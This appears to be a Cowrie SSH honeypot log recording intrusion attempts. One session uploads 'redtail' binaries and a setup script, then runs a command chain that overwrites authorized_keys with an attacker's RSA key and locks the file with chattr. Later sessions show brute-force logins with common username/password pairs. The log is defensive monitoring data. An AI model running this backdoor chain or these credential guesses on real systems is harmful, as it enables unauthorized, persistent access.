+2024-06-07T21:36:09.846013Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: OPEN requestId=185
+2024-06-07T21:36:09.846247Z [HoneyPotSSHTransport,145,164.215.103.47] SFTP openFile: b'setup.sh'
+2024-06-07T21:36:10.155596Z [twisted.conch.ssh.filetransfer.FileTransferServer#info] dispatching: WRITE requestId=186
+2024-06-07T21:36:10.466162Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request
+2024-06-07T21:36:10.466478Z [cowrie.ssh.session.HoneyPotSSHSession#info] channel open
+2024-06-07T21:36:10.827930Z [twisted.conch.ssh.session#info] Executing command "b'chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A"\n'"
+2024-06-07T21:36:10.828938Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,145,164.215.103.47] CMD: chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; 
+2024-06-07T21:36:10.830000Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,145,164.215.103.47] Command found: chmod +x setup.sh
+2024-06-07T21:36:10.830348Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,145,164.215.103.47] Command found: sh setup.sh
+2024-06-07T21:36:10.830481Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,145,164.215.103.47] Command found: rm -rf setup.sh
+2024-06-07T21:36:10.830628Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,145,164.215.103.47] Command found: mkdir -p ~/.ssh
+2024-06-07T21:36:10.830771Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,145,164.215.103.47] Command found: chattr -ia ~/.ssh/authorized_keys
+2024-06-07T21:36:10.830891Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,145,164.215.103.47] Command found: echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629 > ~/.ssh/authorized_keys
+2024-06-07T21:36:10.831261Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,145,164.215.103.47] Command found: chattr +ai ~/.ssh/authorized_keys
+2024-06-07T21:36:10.831386Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,145,164.215.103.47] Command found: uname -a
+2024-06-07T21:36:10.831685Z [SSHChannel session (1) on SSHService b'ssh-connection' on HoneyPotSSHTransport,145,164.215.103.47] Command found: echo -e \x61\x75\x74\x68\x5F\x6F\x6B\x0A
+2024-06-07T21:36:10.831960Z [twisted.conch.ssh.session#info] exitCode: 0
+2024-06-07T21:36:10.832084Z [cowrie.ssh.connection.CowrieSSHConnection#debug] sending request b'exit-status'
+2024-06-07T21:36:10.832234Z [cowrie.ssh.connection.CowrieSSHConnection#info] sending close 1
+2024-06-07T21:36:11.141104Z [cowrie.ssh.session.HoneyPotSSHSession#info] remote close
+2024-06-07T21:36:11.141510Z [HoneyPotSSHTransport,145,164.215.103.47] Saved redir contents with SHA-256 8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b to var/lib/cowrie/downloads/8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b
+2024-06-07T21:36:11.142177Z [HoneyPotSSHTransport,145,164.215.103.47] Closing TTY Log: var/lib/cowrie/tty/9e9b70dbc5e283e2d4f8bcdfb03edb8710aa71e07d5812d43adca812648ed266 after 0 seconds
+2024-06-07T21:36:11.146808Z [HoneyPotSSHTransport,145,164.215.103.47] SFTP Uploaded file "redtail.arm7" to var/lib/cowrie/downloads/a843ac9c087f399fbf8ef10fec872a732c9cf97c2cd249566a6133a2cebdc0c1
+2024-06-07T21:36:11.151890Z [HoneyPotSSHTransport,145,164.215.103.47] SFTP Uploaded file "redtail.arm8" to var/lib/cowrie/downloads/88dc89bf303026c3ea273d879148e308a503cb211538f4cc47b667cf9f43bebb
+2024-06-07T21:36:11.157937Z [HoneyPotSSHTransport,145,164.215.103.47] SFTP Uploaded file "redtail.i686" to var/lib/cowrie/downloads/8fc5d13238daba3a4986d674ad885f81850c67000c7f4f57df707f5d810ad241
+2024-06-07T21:36:11.164009Z [HoneyPotSSHTransport,145,164.215.103.47] SFTP Uploaded file "redtail.x86_64" to var/lib/cowrie/downloads/19a06de9a8b66196fa6cc9e86824dee577e462cbeaf36d715c8fea5bcb08b54d
+2024-06-07T21:36:11.164927Z [HoneyPotSSHTransport,145,164.215.103.47] SFTP Uploaded file "setup.sh" to var/lib/cowrie/downloads/5ffdf7536899526ec78197a286399f011f4723f814412d097aa65d76072f1b65
+2024-06-07T21:36:11.165442Z [HoneyPotSSHTransport,145,164.215.103.47] avatar root logging out
+2024-06-07T21:36:11.165550Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T21:36:11.165634Z [HoneyPotSSHTransport,145,164.215.103.47] Connection lost after 61 seconds
+2024-06-07T21:48:50.309785Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 205.210.31.33:50447 (172.31.41.134:2222) [session: 7c8648209d49]
+2024-06-07T21:48:50.590014Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T21:48:50.590212Z [HoneyPotSSHTransport,146,205.210.31.33] Connection lost after 0 seconds
+2024-06-07T21:53:07.311156Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 183.99.4.254:62117 (172.31.41.134:2222) [session: b4048783acff]
+2024-06-07T21:53:07.465091Z [HoneyPotSSHTransport,147,183.99.4.254] Remote SSH version: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
+2024-06-07T21:53:07.618263Z [HoneyPotSSHTransport,147,183.99.4.254] SSH client hassh fingerprint: 9d31b8e6c87f893d077ca6526f7c710b
+2024-06-07T21:53:07.619159Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'diffie-hellman-group14-sha1' key alg=b'ssh-rsa'
+2024-06-07T21:53:07.619266Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha1' b'none'
+2024-06-07T21:53:07.619362Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha1' b'none'
+2024-06-07T21:53:08.121671Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T21:53:08.319133Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:08.474133Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' trying auth b'password'
+2024-06-07T21:53:08.474448Z [HoneyPotSSHTransport,147,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:08.474612Z [HoneyPotSSHTransport,147,183.99.4.254] login attempt [b'ubuntu'/b'ubuntu'] failed
+2024-06-07T21:53:09.476464Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' failed auth b'password'
+2024-06-07T21:53:09.476728Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:09.630382Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:09.805251Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' trying auth b'password'
+2024-06-07T21:53:09.805576Z [HoneyPotSSHTransport,147,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:09.805739Z [HoneyPotSSHTransport,147,183.99.4.254] login attempt [b'ubuntu'/b'123456'] failed
+2024-06-07T21:53:10.807556Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' failed auth b'password'
+2024-06-07T21:53:10.807789Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:10.967456Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:11.120841Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' trying auth b'password'
+2024-06-07T21:53:11.121159Z [HoneyPotSSHTransport,147,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:11.121329Z [HoneyPotSSHTransport,147,183.99.4.254] login attempt [b'ubuntu'/b'123'] failed
+2024-06-07T21:53:12.123141Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' failed auth b'password'
+2024-06-07T21:53:12.123420Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:12.276734Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:12.430121Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' trying auth b'password'
+2024-06-07T21:53:12.431261Z [HoneyPotSSHTransport,147,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:12.431437Z [HoneyPotSSHTransport,147,183.99.4.254] login attempt [b'ubuntu'/b'1234'] failed
+2024-06-07T21:53:13.432910Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' failed auth b'password'
+2024-06-07T21:53:13.433144Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:13.589069Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:13.743061Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' trying auth b'password'
+2024-06-07T21:53:13.743377Z [HoneyPotSSHTransport,147,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:13.743540Z [HoneyPotSSHTransport,147,183.99.4.254] login attempt [b'ubuntu'/b'Ubuntu123'] failed
+2024-06-07T21:53:14.745337Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' failed auth b'password'
+2024-06-07T21:53:14.745585Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:14.899148Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:15.099167Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' trying auth b'password'
+2024-06-07T21:53:15.099505Z [HoneyPotSSHTransport,147,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:15.099668Z [HoneyPotSSHTransport,147,183.99.4.254] login attempt [b'ubuntu'/b'123456789'] failed
+2024-06-07T21:53:16.101489Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' failed auth b'password'
+2024-06-07T21:53:16.101717Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:16.255873Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:16.409575Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' trying auth b'password'
+2024-06-07T21:53:16.409896Z [HoneyPotSSHTransport,147,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:16.410053Z [HoneyPotSSHTransport,147,183.99.4.254] login attempt [b'ubuntu'/b'Password@123'] failed
+2024-06-07T21:53:17.411890Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' failed auth b'password'
+2024-06-07T21:53:17.412128Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:17.630963Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:17.785745Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' trying auth b'password'
+2024-06-07T21:53:17.786058Z [HoneyPotSSHTransport,147,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:17.786229Z [HoneyPotSSHTransport,147,183.99.4.254] login attempt [b'ubuntu'/b'1qazXSW@'] failed
+2024-06-07T21:53:18.788057Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' failed auth b'password'
+2024-06-07T21:53:18.788285Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:18.942549Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:19.096767Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' trying auth b'password'
+2024-06-07T21:53:19.097080Z [HoneyPotSSHTransport,147,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:19.097250Z [HoneyPotSSHTransport,147,183.99.4.254] login attempt [b'ubuntu'/b'1qaz2wsx#EDC'] failed
+2024-06-07T21:53:20.099284Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ubuntu' failed auth b'password'
+2024-06-07T21:53:20.099542Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:20.259337Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T21:53:20.259532Z [HoneyPotSSHTransport,147,183.99.4.254] Connection lost after 12 seconds
+2024-06-07T21:53:20.404731Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 183.99.4.254:62218 (172.31.41.134:2222) [session: 9428421c6cf8]
+2024-06-07T21:53:20.550348Z [HoneyPotSSHTransport,148,183.99.4.254] Remote SSH version: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
+2024-06-07T21:53:20.695154Z [HoneyPotSSHTransport,148,183.99.4.254] SSH client hassh fingerprint: 9d31b8e6c87f893d077ca6526f7c710b
+2024-06-07T21:53:20.696106Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'diffie-hellman-group14-sha1' key alg=b'ssh-rsa'
+2024-06-07T21:53:20.696213Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha1' b'none'
+2024-06-07T21:53:20.696316Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha1' b'none'
+2024-06-07T21:53:21.135168Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T21:53:21.322212Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:21.549946Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'vadmin' trying auth b'password'
+2024-06-07T21:53:21.550257Z [HoneyPotSSHTransport,148,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:21.550421Z [HoneyPotSSHTransport,148,183.99.4.254] login attempt [b'vadmin'/b'vadmin'] failed
+2024-06-07T21:53:22.552209Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'vadmin' failed auth b'password'
+2024-06-07T21:53:22.552450Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:22.697984Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:22.845285Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'vadmin' trying auth b'password'
+2024-06-07T21:53:22.845597Z [HoneyPotSSHTransport,148,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:22.845763Z [HoneyPotSSHTransport,148,183.99.4.254] login attempt [b'vadmin'/b'9vt@f3Vt'] failed
+2024-06-07T21:53:23.847610Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'vadmin' failed auth b'password'
+2024-06-07T21:53:23.847854Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:24.206035Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:24.351869Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'vadmin' trying auth b'password'
+2024-06-07T21:53:24.352265Z [HoneyPotSSHTransport,148,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:24.352437Z [HoneyPotSSHTransport,148,183.99.4.254] login attempt [b'vadmin'/b''] failed
+2024-06-07T21:53:25.354275Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'vadmin' failed auth b'password'
+2024-06-07T21:53:25.354533Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:25.500147Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T21:53:25.500356Z [HoneyPotSSHTransport,148,183.99.4.254] Connection lost after 5 seconds
+2024-06-07T21:53:25.654068Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 183.99.4.254:62251 (172.31.41.134:2222) [session: edd77ee3544e]
+2024-06-07T21:53:25.808205Z [HoneyPotSSHTransport,149,183.99.4.254] Remote SSH version: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
+2024-06-07T21:53:25.962069Z [HoneyPotSSHTransport,149,183.99.4.254] SSH client hassh fingerprint: 9d31b8e6c87f893d077ca6526f7c710b
+2024-06-07T21:53:25.963008Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'diffie-hellman-group14-sha1' key alg=b'ssh-rsa'
+2024-06-07T21:53:25.963119Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha1' b'none'
+2024-06-07T21:53:25.963228Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha1' b'none'
+2024-06-07T21:53:26.407187Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T21:53:26.603141Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:26.758490Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'fliruser' trying auth b'password'
+2024-06-07T21:53:26.758809Z [HoneyPotSSHTransport,149,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:26.758972Z [HoneyPotSSHTransport,149,183.99.4.254] login attempt [b'fliruser'/b'3vlig'] failed
+2024-06-07T21:53:27.760935Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'fliruser' failed auth b'password'
+2024-06-07T21:53:27.762390Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:27.973076Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:28.150915Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'fliruser' trying auth b'password'
+2024-06-07T21:53:28.151278Z [HoneyPotSSHTransport,149,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:28.151461Z [HoneyPotSSHTransport,149,183.99.4.254] login attempt [b'fliruser'/b'fliruser'] failed
+2024-06-07T21:53:29.153362Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'fliruser' failed auth b'password'
+2024-06-07T21:53:29.153596Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:29.307432Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T21:53:29.307626Z [HoneyPotSSHTransport,149,183.99.4.254] Connection lost after 3 seconds
+2024-06-07T21:53:29.460376Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 183.99.4.254:62280 (172.31.41.134:2222) [session: aba5b4ddf9f6]
+2024-06-07T21:53:29.614311Z [HoneyPotSSHTransport,150,183.99.4.254] Remote SSH version: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
+2024-06-07T21:53:29.767071Z [HoneyPotSSHTransport,150,183.99.4.254] SSH client hassh fingerprint: 9d31b8e6c87f893d077ca6526f7c710b
+2024-06-07T21:53:29.768010Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'diffie-hellman-group14-sha1' key alg=b'ssh-rsa'
+2024-06-07T21:53:29.768155Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha1' b'none'
+2024-06-07T21:53:29.768244Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha1' b'none'
+2024-06-07T21:53:30.291597Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T21:53:30.486679Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:30.640212Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ont' trying auth b'password'
+2024-06-07T21:53:30.640548Z [HoneyPotSSHTransport,150,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:30.640777Z [HoneyPotSSHTransport,150,183.99.4.254] login attempt [b'ont'/b'ont'] failed
+2024-06-07T21:53:31.642573Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'ont' failed auth b'password'
+2024-06-07T21:53:31.642812Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:31.796782Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T21:53:31.796984Z [HoneyPotSSHTransport,150,183.99.4.254] Connection lost after 2 seconds
+2024-06-07T21:53:31.950052Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 183.99.4.254:62291 (172.31.41.134:2222) [session: fef8cf0e5832]
+2024-06-07T21:53:32.104167Z [HoneyPotSSHTransport,151,183.99.4.254] Remote SSH version: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
+2024-06-07T21:53:32.256923Z [HoneyPotSSHTransport,151,183.99.4.254] SSH client hassh fingerprint: 9d31b8e6c87f893d077ca6526f7c710b
+2024-06-07T21:53:32.257854Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'diffie-hellman-group14-sha1' key alg=b'ssh-rsa'
+2024-06-07T21:53:32.257981Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha1' b'none'
+2024-06-07T21:53:32.258076Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha1' b'none'
+2024-06-07T21:53:32.692978Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T21:53:32.890997Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:33.048129Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'fliruser' trying auth b'password'
+2024-06-07T21:53:33.048452Z [HoneyPotSSHTransport,151,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:33.048613Z [HoneyPotSSHTransport,151,183.99.4.254] login attempt [b'fliruser'/b'3vlig'] failed
+2024-06-07T21:53:34.050532Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'fliruser' failed auth b'password'
+2024-06-07T21:53:34.050799Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:34.206090Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:34.378110Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'fliruser' trying auth b'password'
+2024-06-07T21:53:34.378433Z [HoneyPotSSHTransport,151,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:34.378632Z [HoneyPotSSHTransport,151,183.99.4.254] login attempt [b'fliruser'/b'fliruser'] failed
+2024-06-07T21:53:35.380522Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'fliruser' failed auth b'password'
+2024-06-07T21:53:35.380799Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:35.534227Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T21:53:35.534486Z [HoneyPotSSHTransport,151,183.99.4.254] Connection lost after 3 seconds
+2024-06-07T21:53:35.687872Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 183.99.4.254:62315 (172.31.41.134:2222) [session: 9fff2edf6ffe]
+2024-06-07T21:53:35.843043Z [HoneyPotSSHTransport,152,183.99.4.254] Remote SSH version: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
+2024-06-07T21:53:35.996660Z [HoneyPotSSHTransport,152,183.99.4.254] SSH client hassh fingerprint: 9d31b8e6c87f893d077ca6526f7c710b
+2024-06-07T21:53:35.997601Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'diffie-hellman-group14-sha1' key alg=b'ssh-rsa'
+2024-06-07T21:53:35.997733Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha1' b'none'
+2024-06-07T21:53:35.997824Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha1' b'none'
+2024-06-07T21:53:36.430558Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T21:53:36.626413Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:36.780390Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root1' trying auth b'password'
+2024-06-07T21:53:36.780745Z [HoneyPotSSHTransport,152,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:36.780914Z [HoneyPotSSHTransport,152,183.99.4.254] login attempt [b'root1'/b'root1'] failed
+2024-06-07T21:53:37.782713Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root1' failed auth b'password'
+2024-06-07T21:53:37.782955Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T21:53:37.938806Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T21:53:38.094615Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root1' trying auth b'password'
+2024-06-07T21:53:38.094929Z [HoneyPotSSHTransport,152,183.99.4.254] Could not read etc/userdb.txt, default database activated
+2024-06-07T21:53:38.095094Z [HoneyPotSSHTransport,152,183.99.4.254] login attempt [b'root1'/b''] failed
